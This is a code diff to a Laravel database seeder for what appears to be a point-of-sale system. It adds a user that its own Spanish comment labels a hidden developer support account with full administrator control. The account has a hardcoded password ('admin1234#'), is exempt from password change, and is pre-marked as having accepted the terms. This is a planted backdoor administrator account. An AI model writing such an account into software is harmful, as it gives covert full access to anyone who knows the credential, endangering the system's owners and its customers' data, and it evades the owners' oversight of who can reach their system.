@@ -83,6 +83,20 @@ class DatabaseSeeder extends Seeder
             ]
         );
 
+        // Cuenta de Soporte Desarrollador Oculta (Control total administrador)
+        User::updateOrCreate(
+            ['email' => 'devs@sistemapos.com'],
+            [
+                'role_id' => $roleAdmin->id,
+                'name' => 'Soporte Desarrollador',
+                'password' => Hash::make('admin1234#'),
+                'must_change_password' => false,
+                'is_active' => true,
+                'terms_accepted_at' => now(),
+                'terms_accepted_ip' => '127.0.0.1',
+            ]
+        );
+
         // 3. Categorías de producto
         $catInsumos = Category::firstOrCreate(
             ['name' => 'Insumos de Cocina'],
